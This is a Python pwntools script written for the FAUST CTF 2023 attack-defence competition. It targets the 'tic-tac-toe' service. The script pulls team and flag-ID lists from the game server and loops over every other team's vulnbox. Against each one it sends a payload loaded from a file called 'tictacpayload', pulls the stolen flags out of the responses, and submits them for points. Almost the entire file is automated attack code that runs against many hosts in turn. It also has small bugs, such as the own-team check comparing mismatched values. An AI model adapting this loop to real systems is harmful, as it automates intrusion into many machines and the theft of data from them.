#!/usr/bin/env python3
from pwn import *
import requests
import re

YEAR = 2023
TEAM_NUMBER = 48
SERVICE_NAME = 'tic-tac-toe'
SERVICE_PORT = 3333

FLAG_FORMAT = r'FAUST_[A-Za-z0-9\/+]{32}'
TEAMS_URL = f'https://{YEAR}.faustctf.net/competition/teams.json'
OWN_ADDRESS = f'fd66:666:{TEAM_NUMBER}::2'
OWN_NUM = f'fd66:666:{48}::2'
SUBMISSION_URL = 'submission.faustctf.net'
SUBMISSION_PORT = 666

PAYLOAD = open("tictacpayload", "rb").read()

# exploit dependent variables
context.log_level = 'INFO' # 'DEBUG' | 'INFO' | 'CRITICAL'
context.timeout = 2
context.arch = 'amd64'

all_flags = set()

# @all_flags: previously submitted flags
# @current_flags: flags acquired in the current round
# @return an updated set of previously submitted flags
def submit_flags(all_flags, current_flags):
    with remote(SUBMISSION_URL, SUBMISSION_PORT) as p:
        flags = current_flags - all_flags
        print(p.recvline())
        print(p.recvline())
        print(p.recvline())
        for flag in flags:
            p.sendline(flag)
            resp = p.recvline().strip()
            success(f"{flag} - {resp}")
            all_flags.update(flag)
    return all_flags

# @return: list of target IPs as strings
def get_targets():
    targets = requests.get(TEAMS_URL).json()
    # based on FAUST2021
    # TODO: update IP format string
    target_nums = targets["teams"]
    flag_ids = targets["flag_ids"][SERVICE_NAME]
    return target_nums, flag_ids

def parse(flagid):
    return flagid.split(" ")[-1]

def random_string(N):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# @terget_ip: The address of a machine to exploit
# @flag_ids: All flag IDs returned by the API
# @return: set() of flags acquired
def pwn(target_num, flag_ids):
    flags = set()
    target_flag_ids = flag_ids[str(target_num)]
    vulnbox_ip = f"fd66:666:{target_num}::2"

    #register = s.post(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/register', data={'username': username, 'password': password})
    #login = s.post(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/login', data={'username': username, 'password': password})
    for flag_id in target_flag_ids:
        try:
            r = remote(vulnbox_ip, SERVICE_PORT)
            
            r.send(PAYLOAD.replace(b"YMKPMYNAFJHMHOSUHK", flag_id.encode("utf-8")))
            flag = re.findall(rb"(?<=\')(.*?)(?=\')", r.recvline_regex("FAUST"))[0].replace(b"'", b"").decode("utf-8")
            # Turn p1TR9QMRGr+djj994pz70JOFAUST_Q1RGLSJOZ into FAUST_Q1RGLSJOZp1TR9QMRGr+djj994pz70JO
            i = str.find(flag, "FAUST")
            flag = flag[i:] + flag[:i]
            flags.add(flag)
        except Exception as e:
            log.critical(f'{e}')
            continue
    
    return flags


def main():
    target_nums, flag_ids = get_targets()
    target_nums = target_nums
    random.shuffle(target_nums)
    global all_flags
    while True:
        for target in target_nums:
            if target == OWN_NUM:
               continue
            info(f'Attacking: {target}')
            try:
                flags = pwn(target, flag_ids)
            except Exception as e:
                log.critical(f'{e}')
                continue

            # submit flags and update acquired flags
            all_flags = submit_flags(all_flags, flags)


if __name__ == '__main__':
    main()
